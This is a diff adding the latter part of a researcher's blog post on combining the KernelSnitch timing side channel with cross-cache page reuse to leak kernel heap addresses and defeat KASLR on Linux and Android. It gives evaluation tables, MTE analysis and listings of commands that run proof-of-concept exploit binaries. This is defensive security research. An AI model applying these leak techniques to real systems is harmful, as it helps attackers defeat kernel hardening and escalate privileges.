+              <td>lts-6.12.77</td>
+              <td>virtualized x86_64</td>
+              <td><code>msg_msg-1k</code></td>
+              <td>100</td>
+              <td>100</td>
+              <td>99</td>
+              <td>100</td>
+              <td>100</td>
+              <td>99.8</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="caption">Table 2: Reliability across evaluated environments.</div>
+
+      <p>
+        Table 2 shows stable performance across all nine environments and across reboot groups.
+        This indicates that the proof of concept is not tied to a single kernel build or machine profile.
+        The consistency across native and virtualized targets supports the claim that the approach transfers well to different real-world configurations.
+      </p>
+
+      <p>
+        Crucially, the target slab cache varies across systems because allocator configuration and <code>order(mm_cachep)</code> differ by target.
+        For 6.8.0-101-generic, with <code>CONFIG_MEMCG</code> and <code>order(mm_cachep)=3</code>, the target cache is the segregated generic cache <code>kmalloc-cg-4k</code>.
+        For 6.18.13-200.fc43, with <code>CONFIG_SLAB_BUCKETS</code> enabled and <code>order(mm_cachep)=3</code>, the target cache is the bucketed <code>msg_msg-4k</code>.
+        On KernelCTF instances where <code>order(mm_cachep)=2</code>, the corresponding order-2 targets are used, for example <code>kmalloc-cg-1k</code> (lts-6.1.81) and <code>msg_msg-1k</code> (lts-6.12.77).
+      </p>
+
+      <p>
+        For evaluation and reproduction, I provide the proof-of-concept exploit entry points <a href="https://github.com/lukasmaar/kernelsnitch">open source</a>.
+        For practical experiments, Listings 15 and 16 show the command flows, while Figures 1 to 4 show video demonstrations of representative runs.
+        Concretely, I cover three Linux flows (<code>KernelSnitch</code>-only, <code>KernelSnitch + msg_msg</code> reclaim, and <code>KernelSnitch + pipe_buffer</code> reclaim) and two Android flows (native shell execution and <code>untrusted_app</code> APK execution).
+        Crucially, I generated the Android results using the native shell flow and used the APK flow only for cross-validation on a smaller subset (due to manual setup).
+        As a result, APK-based runs may have lower reliability.
+        However, as discussed below, this level of reliability remains practically useful.
+        Also for the KernelCTF evaluation, I slightly changed the <code>nsjail.cfg</code> in order to allow access to <code>/dev/lkm</code>.
+      </p>
+
+      <pre class="terminal-log"><code class="language-sh">ubuntu:/tmp/kernelsnitch$ ./exploits/scripts/estimate_mm_struct.py exploits/configs/config-6.8.0-101-generic 12
+1408 3
+ubuntu:/tmp/kernelsnitch$ ./exploits/kernelsnitch.x86.elf 1408 3 # KernelSnitch only
+...
+ubuntu:/tmp/kernelsnitch$ ./exploits/poc.x86.elf 1408 3 # KernelSnitch + msg_msg reclaim
+...
+ubuntu:/tmp/kernelsnitch$ ./exploits/pipe-poc.x86.elf 1408 3 # KernelSnitch + pipe_buffer reclaim
+...</code></pre>
+      <div class="caption">Listing 15: Linux execution flow (x86_64).</div>
+
+      <pre class="terminal-log"><code class="language-sh"># Variant 1 (native shell flow)
+ubuntu:/tmp/kernelsnitch$ ./exploits/scripts/estimate_mm_struct.py exploits/configs/config-6.1.145-android14 9
+1024 3
+akita:/data/local/tmp$ # Disable SELinux only for controlled evaluation and get access to /dev/lkm
+akita:/data/local/tmp$ ./kernelsnitch.arm.elf 1024 3 # KernelSnitch only
+...
+akita:/data/local/tmp$ ./google-poc.arm.elf 1024 3 # KernelSnitch + pipe_buffer reclaim
+...
+
+# Variant 2 (untrusted_app flow)
+ubuntu:/tmp/kernelsnitch$ ./exploits/android-google-poc/build_apk.sh # Build APK in untrusted_app context
+...
+ubuntu:/tmp/kernelsnitch$ ./exploits/android-google-poc/run_app.sh # Run APK in untrusted_app context
+...
+akita:/data/local/tmp$ ./page-diag.arm.elf &lt;kaddr&gt; # Validate as root
+...</code></pre>
+      <div class="caption">Listing 16: Android execution flows (native shell and <code>untrusted_app</code>).</div>
+
+      <h3 id="android">Results on Android</h3>
+
+      <p>
+        Android is a harder setting compared to the other Linux environments.
+        In practice, Android kernel exploitation is more difficult because the environment is more restrictive and background activity is higher.
+        In this setup, <code>msg_msg</code> is not a viable reclaim target because of its mandatory access control system SELinux.
+        So, I use <code>pipe_buffer</code> instead.
+        However, reusing the same (even slightly optimized) proof of concept reduces reliability to below 80%.
+        The main reason is the combination of higher allocator pressure and smaller available PCP capacity on Android.
+        Even the low-noise free path via closing the child's <code>mem</code> file can still overpressure PCP.
+        Once that happens, the leaked page is likely drained into buddy and becomes harder to reclaim in the intended target context.
+      </p>
+
+      <p>
+        Before continuing, it is good to understand this PCP refill and drain behavior.
+        When PCP occupancy approaches its upper bound, pages are drained back to buddy.
+        When PCP occupancy drops close to empty, pages are refilled from buddy.
+        Across the Linux systems in Table 2 except Android, effective PCP capacity varies with load and often spans from a few hundred to a few thousand pages.
+        By contrast, capacity is tighter on Android, with fixed pages of around 500, and more aggressive refill/drain behavior (atleast from what I have observed).
+      </p>
+
+      <p>
+        In practice, this behavior explains most failure cases.
+        During the critical phase of the cross-cache reuse, PCP pressure can become too high and trigger bulk refill/drain events, which makes reclaiming much less predictable.
+        I analyzed this with multiple diagnostics to understand the gap between Android and the other environments.
+        First, I used <code>tracefs</code> to observe when PCP falls back to buddy (which I would recommend you try out).
+        Then, I used <code>/proc/buddyinfo</code> and <code>/proc/zoneinfo</code> to track free blocks per buddy order and current PCP occupancy.
+        In the other Linux environments from Table 2, these files are unprivileged-accessible and provide strong side-channel signals for refill/drain detection, but on Android SELinux blocks direct access.
+        A possible workaround for <code>/proc/buddyinfo</code> is a producer/consumer design:
+        the privileged process <code>traced</code> reads <code>/proc/buddyinfo</code>, publishes relevant counters, and the untrusted side consumes those updates without accessing the file directly.
+        While this works in some security contexts, it also makes the proof of concept notably more complex, and the sampling period is limited to a few milliseconds.
+      </p>
+
+      <p>
+        Bearing in mind the main cause of failure, a reliability of 70-80% can still be practically useful.
+        The key point is that in failure cases the page is typically still owned by PCP or buddy, rather than by an unrelated live kernel object.
+        So an attacker can proceed under the reclaim assumption and test follow-up exploitation steps on the candidate <code>pipe_buffer</code> page, e.g., a controlled write.
+        If reclaim did not happen, writes usually land on a page that is currently not used, so the write is effectively ignored.
+      </p>
+
+      <h3 id="mte">MTE Implications</h3>
+
+      <p>
+        ARM Memory Tagging Extension (MTE) adds a lightweight hardware memory-safety mechanism by enforcing tag checks on memory accesses.
+        As a result, it mitigates many type-confusion exploitation paths (e.g., in slab use-after-free and slab out-of-bounds scenarios).
+        Concretely, each 16-byte memory granule has a 4-bit allocation tag, and each pointer carries a 4-bit logical tag in its top byte.
+        On tag-checked loads and stores, the CPU compares the pointer's logical tag with the granule's allocation tag and raises a fault on mismatch.
+        The pointer tag is encoded in the address top byte, while allocation tags are stored in dedicated hardware tag storage.
+      </p>
+
+      <p>
+        While MTE can detect tag-mismatched dereferences, it does not stop side-channel observations or pointer leakage that recover valid kernel addresses without ever triggering an invalid tagged access.
+        The attack presented here relies on exactly that property, so it remains effective on MTE-enabled systems.
+      </p>
+
+      <p>
+        But KernelSnitch goes one step further.
+        It leaks <strong>full kernel pointer values</strong>, and for tagged pointers this includes the top-byte logical tag.
+        In practice, this means that in the brute-force phase of Listing 8, I additionally test the 16 possible tag values to leak the correct tag value.
+        While this is a strong primitive, it should be interpreted carefully: on its own, it is a tag oracle for the leaked object (here, <code>mm_struct</code>) and not for the reclaimed object such as <code>pipe_buffer</code>.
+        However, the broader idea can be extended, as also noted by <a href="https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html">Jann Horn</a>, because similar pointer-leak patterns may apply to other kernel objects as well.
+      </p>
+
+      <p>
+        To verify these claims, I perform the evaluations in Table 2 on the Google Pixel 8a with kernel MTE enabled, leaking the address as well as its correct tag value.
+      </p>
+
+      <h3 id="runtime">Runtime Results</h3>
+
+      <p>
+        There are three phases with different effects on runtime: collision finding, candidate brute force, and cross-cache reuse.
+        Collision finding and cross-cache reuse are the faster phases and usually complete within a few seconds.
+        For the brute-force phase, the runtime of these proof-of-concept experiments varies significantly across kernels and systems (as seen in Figures 1 to 4).
+        One major factor is whether the kernel enables physical base randomization.
+        For instance, on Ubuntu, Fedora, and KernelCTF, the physmap base is randomized, illustrated by the <code>page_offset_base</code> offset in Figure 6.
+        As a result, the brute-force phase must search a much larger candidate space, and runtime depends in part on where the actual base falls within that range.
+        In contrast, systems such as Raspberry Pi 3 and Android do not use this kind of physical base randomization, as already shown by <a href="https://projectzero.google/2025/11/defeating-kaslr-by-doing-nothing-at-all.html">Seth Jenkins</a> for Google Pixels.
+        There, the brute-force phase only needs to recover the <code>mm_struct</code> object position within the physmap with a know base address, which is significantly faster.
+        A second major factor is how much parallelism the system allows.
+        For example, the ThinkPad P14s Gen 5 provides 20 usable cores (see Figure 1), so the brute-force phase can split the search across 20 threads.
+        A KernelCTF instance (see Figures 2 and 3), in contrast, only provides 2 cores, which limits concurrency and increases runtime.
+        Overall, the dominant runtime cost is the brute-force phase, while the surrounding setup and reclaim stages are comparatively small and stable.
+      </p>
+      
+      <p>
+        As a reference point, even on KernelCTF instances virtualized with KVM on my Ubuntu laptop, the full leak completes in under 5 minutes.
+        On the native Fedora experiments, it completes in under 1 minute typically.
+      </p>
+
+      <h2 id="conclusion">Conclusion</h2>
+
+      <p>
+        In this post, I showed how to combine KernelSnitch with same-page-order cross-cache reuse to build a practical heap KASLR leak without relying on a memory-safety vulnerability.
+        Starting from a timing-based <code>mm_struct</code> leak, I demonstrated how to return the leaked <code>mm_cachep</code> slab page (order <code>mm_order</code>) to PCP and reclaim it in a more relevant target context.
+        This reclaim targets <code>msg_msg</code> and <code>pipe_buffer</code>, two widely used objects for kernel exploitation.
+        The evaluation confirms that this approach remains robust across kernels, devices, and deployment models.
+        The key takeaway is that side-channel signal quality and allocator-state massaging together can yield this <code>msg_msg</code>/<code>pipe_buffer</code> leak primitive.
+        Moreover, since I did not rely on a memory-safety vulnerability, defenses such as MTE cannot mitigate this kind of leakage attack.
+      </p>
+
+      <p>
+        Here, I showed how to generically leak <code>mm_cachep</code> slab pages across different <code>mm_order</code> values, including all candidate slots when the reclaimed page is used as a slab page.
+        While this is useful for kernel exploitation, some targets require leaking different locations.
+        In those cases, the target locations may not lie on the same page order as <code>mm_cachep</code>.
+        This means the buddy allocator must be considered.
+
+        One option is cross-page-order cross-cache reuse, where allocator state is massaged so pages returned from PCP are split or merged in a favorable way.
+        Because the buddy allocator is globally shared, additional stabilization techniques are usually needed to make this reliable (such as <code>/proc</code> files if available).
+
+        A second option is to avoid direct cross-cache reuse and instead leverage favorable neighbor placement between target objects and <code>mm_struct</code>.
+        However, similar to cross-page-order reuse, this strategy also depends on buddy-state massaging.
+      </p>
+
+      <p>
+        If you find this work interesting, have questions, or notice technical inaccuracies, feel free to contact me at <a href="mailto:lukas.maar@tugraz.at">lukas.maar@tugraz.at</a>.
+      </p>
+
+      <p>
+        While I developed the exploit itself, parts of the build scripts and test environments were created with AI assistance (notably using Codex), and the text received editing with AI tools.
+        Also thanks to <a href="https://ecomaikgolf.com/">Ernesto García</a>, <a href="https://www.linkedin.com/in/lorenz-schumm-7a810b228/">Lorenz Schumm</a> and <a href="https://mathiasoberhuber.com/">Mathias Oberhuber</a> for helping improve the readability of this post.
+      </p>
+
+      <h2 id="references">Useful References</h2>
+
+      <ul>
+        <li><a href="../../publications/ndss25-kernelsnitch.pdf">Lukas Maar, Jonas Juffinger, Thomas Steinbauer, Daniel Gruss, and Stefan Mangard. KernelSnitch. In NDSS, 2025.</a></li>
+        <li><a href="../../slides/nullcon25-sidechannels.pdf">Lukas Maar. Talk on operating-system side channels. In Nullcon Berlin, 2025.</a></li>
+        <li><a href="https://projectzero.google/2021/10/how-simple-linux-kernel-memory.html">Jann Horn. How a simple Linux kernel memory corruption bug can lead to complete system compromise. 2021.</a></li>
+        <li><a href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/">ruia-ruia. CVE-2022-29582 io_uring write-up. 2022.</a></li>
+        <li><a href="../../publications/usenix24-slubstick.pdf">Lukas Maar, Stefan Gast, Martin Unterguggenberger, Mathias Oberhuber, and Stefan Mangard. SLUBStick. In USENIX Security, 2024.</a></li>
+        <li><a href="https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html">Jann Horn. Pointer leaks through pointer-keyed behavior. 2025</a></li>
+        <li><a href="https://projectzero.google/2025/11/defeating-kaslr-by-doing-nothing-at-all.html">Seth Jenkins. Defeating KASLR by doing nothing at all. 2025.</a></li>
+        <li><a href="https://claudiomigliorelli.com/assets/papers/pcplost_ndss26.pdf">Andrea Mambretti, Alessandro Sorniotti, Vittorio Zaccaria, and Anil Kurmus. PCPLost. In NDSS, 2026.</a></li>
+        <li><a href="https://insuyun.github.io/pubs/2025/kim%3Acrossx.pdf">Dong-ok Kim, Juhyun Song, and Insu Yun. CROSS-X. In CCS, 2025.</a></li>
+      </ul>
+
+    </article>
+  </main>
+  <script>window.Prism = window.Prism || {}; Prism.manual = true;</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+  <script>
+    Prism.languages.insertBefore('c', 'keyword', {
+      'kernel-attr': /\b(?:__init|____cacheline_aligned_in_smp|__read_mostly|__user|__randomize_layout)\b/,
+      'builtin-type': /\b(?:list_head|hlist_head|plist_head|futex_hash_bucket|futex_key|mm_struct)\b/,
+      'c-int-type': /\b(?:u8|u16|u32|u64|s8|s16|s32|s64|__u8|__u16|__u32|__u64|__s8|__s16|__s32|__s64)\b/,
+      'kernel-macro': /\b(?:FUTEX_KEY_INIT|FUTEX_READ|PAGE_SIZE|MM_PREPARE|MM_SPRAY|MM_BEFORE|MM_AFTER|MM_OBJS_PER_SLAB|MM_ORDER|MM_SZ|MM_PARTIALS|SYSCHK|SIGCHLD|O_RDONLY|SYS_clone|CORE|SIGKILL|NUM_MEASUREMENTS|FUTEX_WAKE_PRIVATE|FUTEX_WAIT_PRIVATE|NUM_AVG_SAMPLES|SYS_futex|PHYS_MAP_START|PHYS_MAP_END|FUTEX_REGION_SIZE|TARGET_COLLISIONS|PILEUP_WAITERS|THRESHOLD_MULTIPLIER|MM_SLAB_SIZE|MM_STRUCT_SIZE|MIN|LEAK_MM_STRUCT|LEAK_MSG_MSG|LEAK_PIPE_BUFFER|PAGE_DIAG|THIS_MODULE|LKM_PAGE_OWNER_UNKNOWN|LKM_PAGE_OWNER_SLAB|LKM_PAGE_OWNER_PCP|LKM_PAGE_OWNER_BUDDY|LKM_PAGE_OWNER_PAGE_ALLOC|IPC_PRIVATE|IPC_CREAT)\b/,
+      'kernel-fn': /\b(?:__enqueue_one_waiter|__compare|lkm_open|lkm_release|lkm_ioctl)\b/
+    });
+    if (Prism.languages.python) {
+      Prism.languages.insertBefore('python', 'builtin', {
+        'kernel-fn': /\b(?:futex_hash|len)\b(?=\s*\()/
+      });
+    }
+    var shellTokenRules = {
+      'term-ok': /^\[\+\](?=\s)/m,
+      'term-info': /^\[\*\](?=\s)/m
+    };
+    if (Prism.languages.bash) {
+      Prism.languages.insertBefore('bash', 'comment', shellTokenRules);
+    }
+    if (Prism.languages.sh) {
+      Prism.languages.insertBefore('sh', 'comment', shellTokenRules);
+    }
+    Prism.highlightAll();
+  </script>
+</body>
+
+</html>
